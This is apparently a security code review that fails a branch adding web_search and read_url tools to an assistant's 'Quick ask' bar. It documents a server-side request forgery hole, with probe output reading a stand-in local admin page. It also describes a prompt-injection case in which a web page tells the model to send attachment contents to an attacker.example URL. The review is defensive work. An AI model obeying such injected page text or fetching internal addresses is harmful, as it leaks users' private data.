# WEB-ACCESS, 0370c2c (Security): FAIL, read_url reaches this PC and the local network, and the bar can now be steered into it

Branch claude/builder-b-web-access, from d235050. I read the diff and the `read_url` code it now offers in Quick ask. On an extract of 0370c2c with an invented profile, `web-access` and `quick-ask-answers-server` pass 6 of 6.

## Part 1, the retry path: fine

- **First retry.** When a provider refuses the full tool list, `streamChat` retries once with `coreTools`: the same list minus every connector tool and the meta tools (`toolIndex`, `META_TOOLS`). For a device, `coreOnly` comes from the already-filtered `fullTools`, so R2's device blocks still hold.
- **Second retry.** Only then does it retry with no tools, adding a system note that says no tools are available. The `offered` and `offeredNames` checks follow `activeTools`, so a call written as text for a dropped tool is answered as "no such tool" and never run.
- **What is remembered.** The refusal level is kept per chat, provider and model. It never widens.

## Part 2, the bar

- **What the bar offers.** It offers exactly `web_search` and `read_url`. `runTool` refuses anything else when `textOnly`, before any other step, and the system text no longer says there are no tools.
- **No card.** Both tools are `read` risk, so no card is ever raised in the bar.
  - The person's rules (`checkToolCall`) only judge workspace tools and `file:` addresses.
  - In the bar there is no workspace, so `read_url` on `file:` is refused ("cannot read files on this computer in Chat mode").

### WA-1 (MEDIUM, required): `read_url` fetches loopback and private addresses, and follows redirects

`readUrl` (`src/server/pluginImport.js:198`) checks only that the address starts with `http` or `https`, then calls `fetch`. That means:
- no private-address check;
- redirects followed automatically;
- no pinned DNS.

`download_file` already has the right guard: `isPrivateAddress`, a DNS lookup pinned to the checked address, and refusal of Bunny's own ports. `read_url` doesn't use it.

The bar now offers `read_url` with no card, and its whole input is the person's question plus web pages the model reads. So a page the model reads (untrusted text) can make it fetch any of these and read back the answer:
- the router's admin page;
- a NAS or printer on the network;
- `169.254.169.254`;
- a service on this PC's `localhost`.

Bunny's own window server is protected by S-1: a fetch with no token gets nothing. Its HTML pages get the token injected, but `readUrl` strips tags, and the `<meta>` with them. Other local services have no such guard.

Probe (`docs/security/web-access-probe/read-url-private.mjs` on 0370c2c, against a stand-in "admin page" on 127.0.0.1):

    http://127.0.0.1:<port>/admin -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2
    http://localhost:<port>/admin -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2
    http://127.0.0.1:<port>/hop -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2   (a redirect to it)

**Fix:**
- Give `read_url` `download_file`'s request path: `isPrivateAddress` on literals and on every DNS answer, the socket pinned to the checked address, and Bunny's own ports refused.
- Follow redirects by hand (`redirect: 'manual'`, at most 5), checking each hop the same way.
- Keep the 15 s limit and the 12,000-character cap.

This gap is older than this change: the chat's `read_url` has it too, at read risk. Fix it in the shared `readUrl`, so both get it.

### WA-2 (MEDIUM, required for the bar): untrusted pages plus the person's attachment plus `read_url` is a way out

The bar can carry a screenshot or a file (W4-8b). With `read_url` and no card, a page the model reads can tell it to `read_url https://attacker.example/?d=<what the screenshot or file says>`, and the request leaves with no click.

**Fix, either one:**
- In the bar, `read_url` only fetches an address that appears in the person's own text or in a `web_search` result from this same answer (exact match, before redirects).
- Or a bar question with a screenshot or file attached gets no tools, as before this change. The bar says "Searching the web is off when something is attached".

(The chat has the same pattern today. That is a follow-up for its own piece, where the person sees each step. In the bar nothing is shown before it happens.)

## Verdict

FAIL at 0370c2c, for WA-1 and WA-2. Part 1, the retry path, and the bar's two-tool limit are correct. A re-review needs the fix diff, this probe refusing all three addresses, and a test for WA-2.
